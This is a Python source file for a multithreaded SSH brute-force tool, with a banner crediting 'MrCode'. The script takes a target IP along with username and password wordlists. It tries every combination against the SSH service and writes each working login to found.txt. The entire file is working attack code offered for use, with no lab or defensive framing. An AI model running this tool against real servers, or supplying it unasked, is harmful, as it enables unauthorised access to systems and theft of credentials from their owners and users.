import paramiko
import argparse
from concurrent.futures import ThreadPoolExecutor, as_completed
import sys
import threading

# Colors
GREEN = "\033[92m"
RED = "\033[91m"
YELLOW = "\033[93m"
RESET = "\033[0m"

# Banner
print(f"""{YELLOW}
███████╗ ███████╗ ██╗  ██╗
██╔════╝ ██╔════╝ ██║  ██║
███████╗ ███████╗ ███████║
╚════██║ ╚════██║ ██╔══██║
███████║ ███████║ ██║  ██║
╚══════╝ ╚══════╝ ╚═╝  ╚═╝

        MrCode | Mohamed Shaaban
        SSH Bruteforce Tool
{RESET}""")

# Thread lock
lock = threading.Lock()
found_credentials = set()

def try_login(target, port, username, password, timeout):
    global found_credentials

    combo = f"{username}:{password}"

    # منع التكرار
    if combo in found_credentials:
        return False

    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        client.connect(
            target,
            port=port,
            username=username,
            password=password,
            timeout=timeout,
            banner_timeout=timeout,
            auth_timeout=timeout
        )

        with lock:
            if combo not in found_credentials:
                found_credentials.add(combo)
                print(f"\n{GREEN}[+] SUCCESS: {combo}{RESET}")

                with open("found.txt", "a") as f:
                    f.write(combo + "\n")

        return True

    except:
        return False
    finally:
        client.close()


def main():
    parser = argparse.ArgumentParser(description="SSH Bruteforce Tool")

    parser.add_argument("-t", "--target", required=True, help="Target IP")
    parser.add_argument("-p", "--port", type=int, default=22)
    parser.add_argument("-U", "--userlist", required=True)
    parser.add_argument("-P", "--passlist", required=True)
    parser.add_argument("-th", "--threads", type=int, default=5)
    parser.add_argument("--timeout", type=int, default=3)

    args = parser.parse_args()

    # Load files
    with open(args.userlist) as f:
        users = [u.strip() for u in f if u.strip()]

    with open(args.passlist) as f:
        passwords = [p.strip() for p in f if p.strip()]

    total = len(users) * len(passwords)
    print(f"{YELLOW}[*] Total attempts: {total}{RESET}")

    count = 0

    with ThreadPoolExecutor(max_workers=args.threads) as executor:
        futures = []

        for user in users:
            for password in passwords:
                futures.append(
                    executor.submit(
                        try_login,
                        args.target,
                        args.port,
                        user,
                        password,
                        args.timeout
                    )
                )

        for future in as_completed(futures):
            count += 1
            sys.stdout.write(f"\r{YELLOW}[*] Tried: {count}/{total}{RESET}")
            sys.stdout.flush()

    print(f"\n{GREEN}[✔] Finished. Found {len(found_credentials)} valid credentials.{RESET}")


if __name__ == "__main__":
    main()
